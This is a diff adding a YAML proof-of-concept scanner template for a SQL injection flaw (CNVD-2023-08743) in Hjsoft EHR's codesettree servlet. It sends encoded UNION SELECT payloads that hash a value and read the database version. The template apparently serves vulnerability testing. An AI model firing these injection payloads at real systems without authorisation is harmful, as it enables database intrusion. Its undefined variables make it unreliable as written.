@@ -1,0 +1,32 @@
+id: yaml-poc-hjsoft-ehr-sql_injection-CNVD-2023-08743
+info:
+  name: Yaml Poc Hjsoft Ehr Sql_Injection Cnvd 2023 08743
+  author: guichen.guo
+  severity: high
+  description: 'Converted from xpoc: yaml-poc-hjsoft-ehr-sql_injection-CNVD-2023-08743'
+  tags: sqli
+  reference:
+  - https://www.cnvd.org.cn/flaw/show/CNVD-2023-08743
+http:
+- method: GET
+  path:
+  - /servlet/codesettree?categories=~31~27~20union~20all~20select~20~27~31~27~2csys~2efn~5fsqlvarbasetostr~28HashBytes~28~27MD~35~27~2c~27~{{s6}}~{{s7}}~{{s8}}~{{s9}}~{{s10}}~27~29~29~2d~2d&codesetid=1&flag=c&parentid=-1&status=1
+  redirects: false
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: word
+    part: body
+    words:
+    - <TreeNode id
+- method: GET
+  path:
+  - /servlet/codesettree?categories=~31~27~20union~20all~20select~20~27{{s11}}~27~2c~40~40version~2d~2d&codesetid=1&flag=c&parentid=-1&status=1
+  redirects: false
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
